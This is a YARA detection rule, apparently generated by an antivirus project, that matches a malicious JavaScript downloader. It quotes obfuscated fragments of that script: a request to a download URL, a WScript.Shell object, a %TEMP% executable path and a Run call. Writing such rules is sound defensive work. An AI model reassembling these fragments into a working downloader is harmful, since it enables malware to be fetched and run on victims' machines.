rule sig_20160330_49874b0d53b1164aa65d15e95c27eeb0 {
  meta:
    description = "datamaliciousorder - file 20160330_49874b0d53b1164aa65d15e95c27eeb0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3ec1e34cf44ab357bb5c1230713d3c64ad9b2254813daa5e38ef13734895c1f4"

  strings:
    $s1  = "_L[_K](\"GET\", \"http://sterdicustom.com/w3iks\", false);" fullword ascii
    $s2  = "var _P = function _G() {return WScript[_AP](\"WScript\"+\".Shell\");}(), _S0 = 11;" fullword ascii
    $s3  = "function _T(_WK, _RE){_EI = _EI * 1; return _WK - _RE;};" fullword ascii
    $s4  = "if (_L[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IF() {return _P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"y9R6db6DrHjemy.ex\" + \"e\";};" fullword ascii
    $s6  = "function _V(){return _Z + \"\";};" fullword ascii
    $s7  = "function _S() {return ((_WQ == true) && (_WQ == _K1)) ? 1 : _EI;};" fullword ascii
    $s8  = "function _Q(_K0){_P[\"Run\"](_K0, _EI, _EI);};" fullword ascii
    $s9  = "function _F(){return 22;};" fullword ascii
    $s10 = "function _PK(_W) {var _X = (1, 2, 3, 4, 5, _W); return _X;};" fullword ascii
    $s11 = "function _DV(){return _AP;};" fullword ascii
    $s12 = "return _T(_VP, _Z0);" fullword ascii
    $s13 = " while (_UU){" fullword ascii
    $s14 = "function _WX()" fullword ascii
    $s15 = "var _J = new this[\"Date\"]();" fullword ascii
    $s16 = "var _K1 = false;" fullword ascii
    $s17 = "_K1 = true; " fullword ascii
    $s18 = "var _WQ = false;" fullword ascii
    $s19 = "_WQ = true; " fullword ascii
    $s20 = "var _X0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}